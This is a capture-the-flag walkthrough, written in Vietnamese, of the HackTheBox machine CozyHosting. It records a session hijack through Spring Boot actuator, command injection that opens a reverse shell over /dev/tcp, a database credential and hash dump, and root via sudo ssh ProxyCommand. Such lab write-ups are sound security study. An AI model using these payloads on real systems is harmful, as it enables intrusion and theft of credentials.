## CozyHosting

- Port Scanning: ``nmap -sV -sC -A -T4 -p- 10.10.11.230``
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: firewall
Running: Fortinet embedded
OS CPE: cpe:/h:fortinet:fortigate_100d
OS details: Fortinet FortiGate 100D firewall
Network Distance: 11 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Nhận thấy scan được 2 cổng dịch vụ trong đó thấy cổng 80 đang chạy http đang mở.
- Trỏ IP về hostname `cozyhosting.htb` theo mô tả của trang. Truy cập địa chỉ ở cổng 80.
- Thử scan vuln web với acunetix -> không phát hiện ra gì
- Scan dir với dirsearch: ``dirsearch -u cozyhosting.htb``

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/1df4019d-6bcc-4ebe-bda2-ec60c4eab5f3)

- Nhận thấy có một vài endpoint `/actuator` khả nghi.
- Sau một hồi research thì được biết actuator là một endpoint (điểm kết nối) được Spring Boot sử dụng để quản lý và giám sát ứng dụng.
- Đặc biệt ở endpoint `sessions` khi truy cập có một sessions có thể là session của user `kanderson`. (CVE-2023-20866 Spring Boot log lại session ID)

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/83b6e1e6-9741-4887-ad5f-cb46dbc0431e)

- Thay giá trị JSESSIONID cookie của kanderson ở trang login thì có được quyền admin của kanderson.

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/7cc4f313-ad5f-4dd6-9cb1-d29dd9410811)

- Ở trang admin có một chức năng cho phép execute ssh với các tham số hostname và username được truyền vào để thực thi câu lệnh dạng ``ssh username@hostname``
- Có thể họ dùng cách nối chuỗi nên ta có thể command injection
- Nhận thấy có thể rce bằng cách này:

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/eeec5e70-0244-42d7-b234-42c70bff0ab4)

- Để dễ dàng ta sẽ tạo một rev shell ``nc -lvnp 9001`` để mở port listen rồi chạy payload ``sh -i >& /dev/tcp/10.10.11.230/9001 0>&1`` tuy nhiên do có một vài ký tự đặc biệt nên khi gửi thông qua HTTP request sẽ không được url enocde
- Tạo mã base64

```
┌──(root㉿kali)-[/home/kali]
└─# echo 'sh -i >& /dev/tcp/10.10.11.230/9001 0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTEuMjMwLzkwMDEgMD4mMQo=
```

- Payload sẽ decode rồi thực thi payload

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/b25b5bfe-ccf1-4690-bccf-1b7987a76cb5)

- Lấy được shell thành công

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/134d4fee-dcd0-4390-804c-7a8e8bb14657)

- Ở đây nhận thấy có một file jar nhưng ta không thể đọc nó nên tôi sẽ tạo một http server bằng python để tải file này về để đọc.

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/ed144c61-3ee6-4455-bd89-411d48a1a237)

- Sau khi giải nén file jar ra thì ta sẽ tìm file cấu hình có chứa thông tin đăng nhập, db, host,... của postgresql ->  `application.propertise` 

 ![image](https://github.com/capy3ra/HackTheBox/assets/80744099/c77728ff-508c-4648-813f-08137051645c)

- Đăng nhập vào postgres

```
$ psql -U postgres -W -h localhost -d cozyhosting 
Password: Vg&nvzAQ7XxR

SELECT table_name 
FROM information_schema.tables
WHERE table_schema = 'public';
 table_name 
------------
 users
 hosts
(2 rows)

select * from users
;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```
- Truy xuất được danh sách user cùng với đó là mật khẩu đã được hash của admin.

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/82833578-c3e4-4f40-87bf-e85a4d09b21e)

- Bruteforce được mật khẩu là `manchesterunited`.

- Đoán được user admin rất có thể của user josh trong file `/etc/passwd`

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/dcb2120c-6e22-4b0b-8864-3296491f40ee)

- Lấy được user flag.
- Leo quyền:
- Sử dụng `sudo -l` để hiển thị thông tin về các lệnh mà người dùng có thể thực hiện với quyền sudo.

```
josh@cozyhosting:~$ sudo -l
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

- Tra trên [GTFO](https://gtfobins.github.io/gtfobins/ssh/) chạy ``sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`` nhận được quyền root

![image](https://github.com/capy3ra/HackTheBox/assets/80744099/89960b05-7b17-44e5-b59e-cd5a33c171fc)
